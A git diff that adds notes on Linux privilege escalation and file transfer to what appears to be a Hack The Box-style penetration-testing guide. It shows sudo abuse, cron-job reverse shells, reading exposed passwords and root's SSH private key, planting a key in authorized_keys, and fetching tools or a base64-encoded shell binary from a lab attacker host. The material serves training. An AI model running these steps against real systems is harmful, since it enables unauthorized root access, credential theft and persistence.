@@ -408,5 +408,203 @@ smb: \flag\> get flag.txt
 
 <figure><img src="../../.gitbook/assets/image (456).png" alt=""><figcaption></figcaption></figure>
 
-## Web Enumeration
+## Privilege Escalation Linux - Basic
 
+### Kernel Exploits
+
+For example, the above script showed us the Linux version to be `3.9.0-73-generic`. If we Google exploits for this version or use `searchsploit`, we would find a `CVE-2016-5195`, otherwise known as `DirtyCow`. We can search for and download the [DirtyCow](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs) exploit and run it on the server to gain root access.\
+
+
+### User Privileges
+
+1. Sudo
+2. SUID
+3. Windows Token Privileges
+
+The `sudo` command in Linux allows a user to execute commands as a different user. It is usually used to allow lower privileged users to execute commands as root without giving them access to the root user. This is generally done as specific commands can only be run as root 'like `tcpdump`' or allow the user to access certain root-only directories. We can check what `sudo` privileges we have with the `sudo -l` command:
+
+```shell-session
+eldeim@htb[/htb]$ sudo -l
+
+[sudo] password for user1:
+...SNIP...
+
+User user1 may run the following commands on ExampleServer:
+    (ALL : ALL) ALL
+```
+
+The above output says that we can run all commands with `sudo`, which gives us complete access, and we can use the `su` command with `sudo` to switch to the root user:
+
+```shell-session
+eldeim@htb[/htb]$ sudo su -
+
+[sudo] password for user1:
+whoami
+root
+```
+
+The above command requires a password to run any commands with `sudo`. There are certain occasions where we may be allowed to execute certain applications, or all applications, without having to provide a password:
+
+```shell-session
+eldeim@htb[/htb]$ sudo -l
+
+    (user : user) NOPASSWD: /bin/echo
+```
+
+The `NOPASSWD` entry shows that the `/bin/echo` command can be executed without a password. This would be useful if we gained access to the server through a vulnerability and did not have the user's password. As it says `user`, we can run `sudo` as that user and not as root. To do so, we can specify the user with `-u user`:
+
+```shell-session
+eldeim@htb[/htb]$ sudo -u user /bin/echo Hello World!
+
+    Hello World!
+```
+
+### Scheduled Tasks
+
+There are usually two ways to take advantage of scheduled tasks (Windows) or cron jobs (Linux) to escalate our privileges:
+
+1. Add new scheduled tasks/cron jobs
+2. Trick them to execute a malicious software
+
+The easiest way is to check if we are allowed to add new scheduled tasks. In Linux, a common form of maintaining scheduled tasks is through `Cron Jobs`. There are specific directories that we may be able to utilize to add new cron jobs if we have the `write` permissions over them. These include:
+
+1. `/etc/crontab`
+2. `/etc/cron.d`
+3. `/var/spool/cron/crontabs/root`
+
+If we can write to a directory called by a cron job, we can write a bash script with a reverse shell command, which should send us a reverse shell when executed.
+
+### Exposed Credentials
+
+This is very common with `configuration` files, `log` files, and user history files (`bash_history` in Linux and `PSReadLine` in Windows). The enumeration scripts we discussed at the beginning usually look for potential passwords in files and provide them to us, as below:
+
+&#x20; Privilege Escalation
+
+```shell-session
+...SNIP...
+[+] Searching passwords in config PHP files
+[+] Finding passwords inside logs (limit 70)
+...SNIP...
+/var/www/html/config.php: $conn = new mysqli(localhost, 'db_user', 'password123');
+```
+
+As we can see, the database password '`password123`' is exposed, which would allow us to log in to the local `mysql` databases and look for interesting information. We may also check for `Password Reuse`, as the system user may have used their password for the databases, which may allow us to use the same password to switch to that user, as follows:
+
+&#x20; Privilege Escalation
+
+```shell-session
+eldeim@htb[/htb]$ su -
+
+Password: password123
+whoami
+
+root
+```
+
+We may also use the user credentials to `ssh` into the server as that user.
+
+### SSH Keys
+
+Finally, let us discuss SSH keys. If we have read access over the `.ssh` directory for a specific user, we may read their private ssh keys found in `/home/user/.ssh/id_rsa` or `/root/.ssh/id_rsa`, and use it to log in to the server. If we can read the `/root/.ssh/` directory and can read the `id_rsa` file, we can copy it to our machine and use the `-i` flag to log in with it:
+
+```shell-session
+eldeim@htb[/htb]$ vim id_rsa
+eldeim@htb[/htb]$ chmod 600 id_rsa
+eldeim@htb[/htb]$ ssh root@10.10.10.10 -i id_rsa
+
+root@10.10.10.10#
+```
+
+> Note that we used the command 'chmod 600 id\_rsa' on the key after we created it on our machine to change the file's permissions to be more restrictive. If ssh keys have lax permissions, i.e., maybe read by other people, the ssh server would prevent them from working.
+
+If we find ourselves with write access to a users`/.ssh/` directory, we can place our public key in the user's ssh directory at `/home/user/.ssh/authorized_keys`. This technique is usually used to gain ssh access after gaining a shell as that user. The current SSH configuration will not accept keys written by other users, so it will only work if we have already gained control over that user. We must first create a new key with `ssh-keygen` and the `-f` flag to specify the output file:
+
+```shell-session
+eldeim@htb[/htb]$ ssh-keygen -f key
+
+Generating public/private rsa key pair.
+Enter passphrase (empty for no passphrase): *******
+Enter same passphrase again: *******
+
+Your identification has been saved in key
+Your public key has been saved in key.pub
+The key fingerprint is:
+SHA256:...SNIP... user@parrot
+The key's randomart image is:
++---[RSA 3072]----+
+|   ..o.++.+      |
+...SNIP...
+|     . ..oo+.    |
++----[SHA256]-----+
+```
+
+This will give us two files: `key` (which we will use with `ssh -i`) and `key.pub`, which we will copy to the remote machine. Let us copy `key.pub`, then on the remote machine, we will add it into `/root/.ssh/authorized_keys`:
+
+```shell-session
+user@remotehost$ echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys
+```
+
+Now, the remote server should allow us to log in as that user by using our private key:
+
+```shell-session
+eldeim@htb[/htb]$ ssh root@10.10.10.10 -i key
+
+root@remotehost# 
+```
+
+## Transferring Files
+
+### Using wget
+
+```shell-session
+user@remotehost$ wget http://10.10.14.1:8000/linenum.sh
+
+...SNIP...
+Saving to: 'linenum.sh'
+
+linenum.sh 100%[==============================================>] 144.86K  --.-KB/s    in 0.02s
+
+2021-02-08 18:09:19 (8.16 MB/s) - 'linenum.sh' saved [14337/14337]
+
+```
+
+### Using CURL
+
+```shell-session
+user@remotehost$ curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
+
+100  144k  100  144k    0     0  176k      0 --:--:-- --:--:-- --:--:-- 176k
+```
+
+> Note that we used the `-o` flag to specify the output file name.
+
+### Using SCP
+
+Another method to transfer files would be using `scp`, granted we have obtained ssh user credentials on the remote host. We can do so as follows:
+
+```shell-session
+eldeim@htb[/htb]$ scp linenum.sh user@remotehost:/tmp/linenum.sh
+
+user@remotehost's password: *********
+linenum.sh
+```
+
+> Note that we specified the local file name after `scp`, and the remote directory will be saved to after the `:`.
+
+### Using Base64
+
+In some cases, we may not be able to transfer the file. For example, the remote host may have firewall protections that prevent us from downloading a file from our machine. In this type of situation, we can use a simple trick to [base64](https://linux.die.net/man/1/base64) encode the file into `base64` format, and then we can paste the `base64` string on the remote server and decode it. For example, if we wanted to transfer a binary file called `shell`, we can `base64` encode it as follows:
+
+```shell-session
+eldeim@htb[/htb]$ base64 shell -w 0
+
+f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU
+```
+
+Now, we can copy this `base64` string, go to the remote host, and use `base64 -d` to decode it, and pipe the output into a file:
+
+```shell-session
+user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
+```
+
+\
